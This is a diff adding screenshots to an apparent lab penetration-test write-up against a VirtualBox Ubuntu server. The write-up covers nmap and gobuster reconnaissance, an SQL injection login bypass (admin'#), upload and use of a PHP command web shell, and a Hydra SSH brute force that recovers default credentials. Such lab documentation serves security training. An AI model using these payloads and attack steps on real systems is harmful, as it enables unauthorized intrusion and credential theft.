@@ -65,6 +65,7 @@ The interface configuration file located at /etc/network/interfaces was modified
 ```bash
 sudo nano /etc/network/interfaces
 ```
+<img width="416" height="53" alt="Screenshot 2026-05-14 234548 - Copy - Copy" src="https://github.com/user-attachments/assets/d26adcb2-0677-4fbe-b239-b253f4fb069a" />
 
 
 ### Network Configuration Blueprint `(/etc/network/interfaces)`:
@@ -81,6 +82,7 @@ iface eth1 inet static
     netmask 255.255.255.0
     gateway 10.216.27.1
 ```
+<img width="416" height="53" alt="Screenshot 2026-05-14 234548 - Copy - Copy" src="https://github.com/user-attachments/assets/4134e553-22bc-40b5-be17-b5e0d7e65756" />
 
 
 ### To apply the changes directly into kernel space without bouncing the physical device hardware, the networking system daemon was restarted:
@@ -88,6 +90,7 @@ iface eth1 inet static
 ```bash
 sudo systemctl restart networking
 ```
+<img width="599" height="59" alt="Screenshot 2026-05-15 181153" src="https://github.com/user-attachments/assets/08c236bb-47df-46e0-85a7-52b43edfb0bf" />
 
 
 ### 2. IP Address & DNS Resolution Verification
@@ -97,12 +100,16 @@ The ip a utility was executed to confirm that the interface eth1 successfully bo
 ```bash
 ip a
 ```
+<img width="1267" height="383" alt="Screenshot 2026-05-14 234602" src="https://github.com/user-attachments/assets/4d494eef-3aab-4516-95c6-cc67f20bad8d" />
+
 
 ### The upstream DNS nameservers were verified inside /etc/resolv.conf to guarantee domain mapping consistency within the local virtual network environment:
 
 ```bash
 sudo nano /etc/resolv.conf
 ```
+<img width="1267" height="383" alt="Screenshot 2026-05-14 234602" src="https://github.com/user-attachments/assets/ea330203-afb7-4e48-9933-c37370709079" />
+
 
 ### 3. ICMP Route Validation (Ping Testing)
 ICMP Echo Request sequences were issued targeting the MikroTik Gateway Router (10.216.27.1) and the Ubuntu Target Server (10.216.27.100) to test node-to-node connectivity:
@@ -119,6 +126,9 @@ ping -c 3 10.216.27.1
 ping -c 3 10.216.27.100
 ```
 
+<img width="800" height="412" alt="Screenshot 2026-05-15 143907" src="https://github.com/user-attachments/assets/e93a5d7c-224b-40d5-9f40-1ee5b215e150" />
+
+
 # Analysis: Both hosts responded cleanly with a metric of 0% packet loss, proving the physical-to-virtual routing lane was highly stable and ready for exploitation.
 
 
@@ -133,6 +143,9 @@ A full-range port scan utilizing Nmap accompanied by default safe scripts and ba
 nmap -Pn -p- -sC -sV -T5 10.216.27.100
 ```
 
+<img width="800" height="412" alt="Screenshot 2026-05-15 143907" src="https://github.com/user-attachments/assets/76b610b2-6ea0-4e2f-89b1-373e7203de07" />
+
+
 # Discovered Open Ports & Services:
 
 => Port 21/tcp (FTP): Running vsftpd 3.0.5. Anonymous FTP login is enabled (Response Code 230), representing an immediate data exposure vector.
@@ -146,6 +159,7 @@ A directory discovery pass was performed using Gobuster against the root web ser
 ```Bash
 gobuster dir -u http://10.216.27.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10
 ```
+<img width="1324" height="356" alt="Screenshot 2026-05-17 222810" src="https://github.com/user-attachments/assets/dc13ca2d-1fad-485d-bd84-77a2360a7672" />
 
 # Discovered Paths: /javascript and /ubuntu. Manual browsing to the /javascript root yielded a 403 Forbidden error response, signaling that directory indexing has been securely disabled on this instance.
 
@@ -155,6 +169,10 @@ gobuster dir -u http://10.216.27.100 -w /usr/share/wordlists/dirbuster/directory
 ## Phase 3: Web Portal Exploitation (SQL Injection & Bypass)
 Navigating to http://10.216.27.100 in a browser presented the administrator authentication dashboard for PT. TechSecure Indonesia.
 
+<img width="1919" height="985" alt="Screenshot 2026-05-17 220015" src="https://github.com/user-attachments/assets/5206b216-6af3-4659-898c-3a6a37510e34" />
+<img width="1919" height="753" alt="Screenshot 2026-05-17 222502" src="https://github.com/user-attachments/assets/d2c8e762-e59c-4c6f-baee-dfe1db2424ac" />
+
+
 ### 1. Authentication Bypass via SQL Injection
 Input validation checks on the username string parameter fields were discovered to be completely missing. Input logic manipulation was carried out using a targeted payload layout:
 
@@ -162,6 +180,9 @@ Input validation checks on the username string parameter fields were discovered 
 Target Username Field: admin'#
 Target Password Field: Arbitrary string data
 ```
+<img width="1919" height="809" alt="Screenshot 2026-05-17 222443" src="https://github.com/user-attachments/assets/8e650732-1320-4682-b13a-50244ee882e0" />
+![Uploading Screenshot 2026-05-17 222502.png…]()
+
 
 # Technical Database Query Analysis (MySQL)
 The backend processing script structures the dynamic query using direct variable concatenation without parameter preparation:
@@ -190,8 +211,9 @@ The file management functions inside the administrative dashboard provided an en
 A back-connect handler script (exploit.php) was authored on the Auditor Node via GNU Nano:
 
 ```Bash
-nano exploit.php
+sudo nano exploit.php
 ```
+<img width="675" height="65" alt="Screenshot 2026-05-17 222941" src="https://github.com/user-attachments/assets/9fb883f7-1d3d-4f5b-abbf-fcbd19cf9462" />
 
 ### Payload Script Logic Structure:
 
@@ -208,6 +230,7 @@ if (isset($_GET['cmd'])) {
 ?>
 
 ```
+<img width="1655" height="660" alt="Screenshot 2026-05-17 223222" src="https://github.com/user-attachments/assets/8ddbdc11-8d86-4931-bcc0-81d427b14000" />
 
 
 ### 2. Uploading the Exploitation Payload
@@ -218,6 +241,7 @@ The application handled the payload upload pipeline without returning any struct
 ```text
 Success! File has been uploaded to: uploads/exploit.php
 ```
+<img width="1655" height="660" alt="Screenshot 2026-05-17 223222" src="https://github.com/user-attachments/assets/6f0d5c63-4e66-4334-8a19-c92274940db6" />
 
 ### 3. Triggering System-Level Remote Code Execution
 System execution capabilities were validated by mapping system calls directly through the URL parameter tracking index string ?cmd=.
@@ -227,12 +251,15 @@ System execution capabilities were validated by mapping system calls directly th
 URL Request: http://10.216.27.100/uploads/exploit.php?cmd=whoami
 Output Stream: Returned the execution context of the hosting engine service account: www-data.
 ```
+<img width="1448" height="775" alt="Screenshot 2026-05-17 230020" src="https://github.com/user-attachments/assets/275086ff-ecf1-4469-8e5b-287ed0e9b586" />
+
 
 ### B. Auditing Web Server File Permissions (ls -la /var/www/html)
 ```text
 URL Request: http://10.216.27.100/uploads/exploit.php?cmd=ls -la /var/www/html
 Critical Finding: The uploads/ folder permissions are globally assigned to mode status drwxrwxrwx (777/world-writable), allowing an unauthenticated external source to drop and maintain persistence hooks.
 ```
+<img width="1522" height="743" alt="Screenshot 2026-05-17 230231" src="https://github.com/user-attachments/assets/f75bc844-aaa3-41d6-bf7a-0db07f987cec" />
 
 
 ---
@@ -247,11 +274,13 @@ Customized string list entries for targeted administrative accounts (users_wordl
 # Creating the Target Username Wordlist
 nano users_wordlist.txt
 ```
+<img width="748" height="447" alt="Screenshot 2026-05-17 231339" src="https://github.com/user-attachments/assets/b739c876-43f6-4b50-aedd-4a130dcb1154" />
 
 ```Bash
 # Creating the Target Password Wordlist
 nano password.txt
 ```
+<img width="675" height="523" alt="Screenshot 2026-05-17 231356" src="https://github.com/user-attachments/assets/3251158c-5cfe-4a70-991c-a120a3e9b63e" />
 
 ### 2. Running the Dictionary Attack Vector (Hydra SSH)
 The multi-threaded logon cracker Hydra was initiated to trace and crack potential login indicators across the target’s network endpoint:
@@ -260,11 +289,13 @@ The multi-threaded logon cracker Hydra was initiated to trace and crack potentia
 hydra -l ubuntu -P password.txt ssh://10.216.27.100
 ```
 
+
 # Recovered Valid Credentials Set:
 ```text
 Username Account: ubuntu
 Password Association: ubuntu
 ```
+<img width="1757" height="257" alt="Screenshot 2026-05-17 231721" src="https://github.com/user-attachments/assets/685d4113-e2a7-4c40-9df6-ebb71b031200" />
 
 ### 3. Stabilizing Foothold Access via SSH
 An interactive encrypted session shell was initialized using the recovered credential profiles to firmly claim local environment entry points:
@@ -272,6 +303,7 @@ An interactive encrypted session shell was initialized using the recovered crede
 ```Bash
 ssh ubuntu@10.216.27.100
 ```
+<img width="1260" height="485" alt="Screenshot 2026-05-17 231836" src="https://github.com/user-attachments/assets/694fede8-5a8f-40a4-9d48-db1bb76f6bd0" />
 
 # Status Profile: Authentication validated cleanly. Local console session context successfully locked into user identity space: ubuntu@ubuntu-VirtualBox.
 
